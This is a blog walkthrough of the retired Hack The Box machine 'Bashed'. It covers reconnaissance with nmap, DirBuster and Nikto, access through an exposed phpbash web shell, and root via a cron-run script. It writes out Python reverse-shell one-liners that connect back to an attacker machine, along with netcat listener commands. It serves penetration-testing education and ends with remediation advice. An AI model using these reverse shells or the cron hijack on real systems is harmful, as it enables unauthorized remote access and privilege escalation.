---
title: Keep Calm and Hack The Box - Bashed
subtitle: ''
author: Sonya Moisset
co_authors: []
series: null
date: '2021-02-26T22:12:20.000Z'
originalURL: https://freecodecamp.org/news/keep-calm-and-hack-the-box-bashed
coverImage: https://www.freecodecamp.org/news/content/images/2021/02/night-city-cyberpunk-2077-1920-1080-1.jpg
tags:
- name: Application Security
  slug: application-security
- name: cybersecurity
  slug: cybersecurity
- name: information security
  slug: information-security
- name: '#infosec'
  slug: infosec
- name: Security
  slug: security
seo_title: null
seo_desc: 'Hack The Box (HTB) is an online platform that allows you to test your penetration
  testing skills.

  It contains several challenges that are constantly updated. Some of them simulate
  real world scenarios and some of them lean more towards a CTF style of...'
---

Hack The Box (HTB) is an online platform that allows you to test your penetration testing skills.

It contains several challenges that are constantly updated. Some of them simulate real world scenarios and some of them lean more towards a CTF style of challenge.

**Note**: _Only write-ups of retired HTB machines are allowed._

![Image](https://www.freecodecamp.org/news/content/images/2021/01/Screenshot-2021-01-05-at-00.03.21.png)

Bashed is an easy machine which focuses on fuzzing and locating important files. Basic knowledge of Linux and cron jobs are necessary. 

We will use the following tools to pawn the box on a [Kali Linux box](https://www.kali.org/):

* nmap
* dirbuster
* nikto
* netcat

Let's get started!

## **Step 1 - Reconnaissance**

The first step before exploiting a machine is to do a little bit of scanning and reconnaissance.

This is one of the most important parts as it will determine what you can try to exploit afterwards. It is always better to spend more time on this phase to get as much information as you can.

### **Port scanning**

I will use **Nmap** (Network Mapper). Nmap is a free and open source utility for network discovery and security auditing.

It uses raw IP packets to determine what hosts are available on the network, what services those hosts are offering, what operating systems they are running, what type of packet filters/firewalls are in use, and dozens of other characteristics.

There are many commands you can use with this tool to scan the network. If you want to learn more about it, you can have a look at the documentation [here](https://tools.kali.org/information-gathering/nmap).

![Image](https://www.freecodecamp.org/news/content/images/2021/01/Screenshot-2021-01-05-at-00.08.12.png)

I use the following command to perform an intensive scan:

```bash
nmap -A -v 10.129.90.251
```

**-A:** Enables OS detection, version detection, script scanning, and traceroute

**-v:** Increases verbosity level

**10.129.90.251**:**** IP address of the Bashed box

If you find the results a little bit too overwhelming, you can try this:

```bash
nmap 10.129.90.251
```

![Image](https://www.freecodecamp.org/news/content/images/2021/02/Screenshot-2021-02-01-at-22.04.49.png)

We can see that there is 1 open port:

**Port** 80, most often used by Hypertext Transfer Protocol (HTTP).

### **Directory scanning**

Still in the scanning and reconnaissance phase, I now use **DirBuster**. DirBuster is a multi threaded Java application designed to brute force directories and file names on web/application servers.

You can launch DirBuster by typing this command on the terminal:

```bash
dirbuster
```

The application looks like this, where you can specify the target URL. In our case it will be **http://10.129.90.251**. You can select a wordlist with the list of **dirs/files** by clicking the Browse button:

![Image](https://www.freecodecamp.org/news/content/images/2021/02/Screenshot-2021-02-01-at-22.10.29.png)

I use the **directory-list-2.3-medium.txt** for this search. We can see a lot of files here:

![Image](https://www.freecodecamp.org/news/content/images/2021/02/Screenshot-2021-02-01-at-22.20.55.png)

I can see some interesting directories to check (/uploads, /dev, /php).

I then use **Nikto**.

> Nikto is an Open Source web server scanner which performs comprehensive tests against web servers for multiple items, checks for outdated versions of over 1250 servers, and version specific problems on over 270 servers.  
>   
> It also checks for server configuration items such as the presence of multiple index files, HTTP server options, and will attempt to identify installed web servers and software.

You can find more info on the tool [here](https://tools.kali.org/information-gathering/nikto).

![Image](https://www.freecodecamp.org/news/content/images/2021/02/Screenshot-2021-02-01-at-22.25.01.png)

I use this command to launch the scan

```bash
nikto -host 10.129.90.251
```

![Image](https://www.freecodecamp.org/news/content/images/2021/02/Screenshot-2021-02-01-at-22.23.46.png)

I can see a couple of interesting directories (/dev, /php). 

## **Step 2 - Visiting the web page**

Let's visit the pages we found from the reconnaissance phase, and start by the main web page. It seems to be a blog on development.

![Image](https://www.freecodecamp.org/news/content/images/2021/02/Screenshot-2021-02-01-at-22.28.03.png)

I click on the **phpbash** article. The page explains what it is and gives a link to a GitHub repository.

![Image](https://www.freecodecamp.org/news/content/images/2021/02/Screenshot-2021-02-01-at-22.31.28.png)

I check the GitHub repository.

![Image](https://www.freecodecamp.org/news/content/images/2021/02/Screenshot-2021-02-01-at-22.29.55.png)
_[https://github.com/Arrexel/phpbash](https://github.com/Arrexel/phpbash)_

I then navigate to the **/dev** folder. It seems that the developer uploaded their code on the website. 

![Image](https://www.freecodecamp.org/news/content/images/2021/02/Screenshot-2021-02-01-at-22.27.16.png)

I click on **phpbash.php** and have access to a shell within the browser at

```bash
http://10.129.90.251/dev/phpbash.php
```

![Image](https://www.freecodecamp.org/news/content/images/2021/02/Screenshot-2021-02-01-at-22.33.02.png)

## **Step** 3 **-** Look for the user.txt flag

I can list all the files/folders with the following command:

```bash
ls -la
```

I then move to the **home** folder with:

```bash
cd home
```

![Image](https://www.freecodecamp.org/news/content/images/2021/02/Screenshot-2021-02-01-at-22.35.56.png)

I find **arrexel**'s folder.

![Image](https://www.freecodecamp.org/news/content/images/2021/02/Screenshot-2021-02-01-at-22.36.05.png)

I navigate into this folder and I find the user flag! I check the content of the file with:

```bash
cat user.txt
```

![Image](https://www.freecodecamp.org/news/content/images/2021/02/Screenshot-2021-02-01-at-22.37.13.png)

## **Step** 4 **-** Performing Privilege Escalation

I need a proper shell for privilege escalation. On the **phpbash** window, I run the following command:

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_MACHINE_IP",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

I set up a **Netcat** listener on port **1234** to catch the reverse shell connection.

> Ncat is a feature-packed networking utility which reads and writes data across networks from the command line.   
>   
> Ncat was written for the Nmap Project as a much-improved reimplementation of the venerable [Netcat](http://sectools.org/tool/netcat/). It uses both TCP and UDP for communication and is designed to be a reliable back-end tool to instantly provide network connectivity to other applications and users.

You can learn more about Netcat [here](https://nmap.org/book/ncat-man.html).

```bash
nc -nvlp 1234
```

![Image](https://www.freecodecamp.org/news/content/images/2021/02/Screenshot-2021-02-01-at-22.58.16.png)

I got a shell and check who I am with

```bash
whoami
```

then run

```bash
sudo -l
```

to understand which command I can run on localhost.

![Image](https://www.freecodecamp.org/news/content/images/2021/02/Screenshot-2021-02-01-at-22.59.12.png)

Let's change to **scriptmanager** to check if this user has access to a folder that www-data could not access. But first I spawn a proper shell with the command

```bash
python -c 'import pty; pty.spawn("/bin.bash");'
```

![Image](https://www.freecodecamp.org/news/content/images/2021/02/Screenshot-2021-02-01-at-23.04.34.png)

I then switch to the user **scriptmanager** with the command

```bash
sudo -u scriptmanager /bin/bash
```

![Image](https://www.freecodecamp.org/news/content/images/2021/02/Screenshot-2021-02-01-at-23.04.47.png)

I then navigate to the **/scripts** folder and see two files (**test.py** and **test.txt**).

![Image](https://www.freecodecamp.org/news/content/images/2021/02/Screenshot-2021-02-01-at-23.06.54.png)

**test.txt** file is owned by root and seems to be the results of the **test.py** script which is owned by scriptmanager.

I check the content of **test.py** with

```bash
cat test.py
```

![Image](https://www.freecodecamp.org/news/content/images/2021/02/Screenshot-2021-02-01-at-23.07.56.png)

and the content of **test.txt** with 

```bash
cat test.txt
```

![Image](https://www.freecodecamp.org/news/content/images/2021/02/Screenshot-2021-02-01-at-23.10.28.png)

I list all the files one more time and I see that the time for **test.tx**t has changed. We can assume that there's a cron job running the **test.py** script from the **/scripts** folder.

![Image](https://www.freecodecamp.org/news/content/images/2021/02/Screenshot-2021-02-01-at-23.10.57.png)

Let's write an exploit with

```
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_MACHINE_IP",1235));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' > exploit.py
```

and save it as **exploit.py**.

I delete the **test.py** file with 

```
rm test.py
```

![Image](https://www.freecodecamp.org/news/content/images/2021/02/Screenshot-2021-02-01-at-23.22.35.png)

I set up another **Netcat** listener on port **1235** to catch the reverse shell connection.

![Image](https://www.freecodecamp.org/news/content/images/2021/02/Screenshot-2021-02-01-at-23.23.08.png)

I am now root! 

I list the cron jobs list to verify my assumption with

```
crontab -l
```

![Image](https://www.freecodecamp.org/news/content/images/2021/02/Screenshot-2021-02-01-at-23.27.25.png)

The cron job executes Python files in the **/scripts** folder.

## **Step** 5 **-** Looking for the root.txt flag

Let's find the root flag now. I navigate up to **root**.

I find the root.txt file and check its content with

```bash
cat root.txt
```

![Image](https://www.freecodecamp.org/news/content/images/2021/02/Screenshot-2021-02-01-at-23.26.45.png)

Congrats! You found both flags.

## **Remediations**

* Apply the p[rinciple of least privilege](https://en.wikipedia.org/wiki/Principle_of_least_privilege) to all your systems and services
* Sensitive files or directories should not be hosted on a server/ or publicly available. A quick reconnaissance will allow an attacker to enumerate folders/files and access them

Please don’t hesitate to ask questions or share with your friends :)

You can see more articles from the series **Keep Calm and Hack the Box** [here](https://www.freecodecamp.org/news/search/?query=keep%20calm%20and%20hack%20the%20box).

You can follow me on [Twitter](https://twitter.com/SonyaMoisset) or on [LinkedIn](https://www.linkedin.com/in/sonyamoisset/).

And don't forget to #**GetSecure**, #**BeSecure** & #**StaySecure**!

![Image](https://www.freecodecamp.org/news/content/images/2021/02/night-city-cyberpunk-2077-1920-1080.jpg)




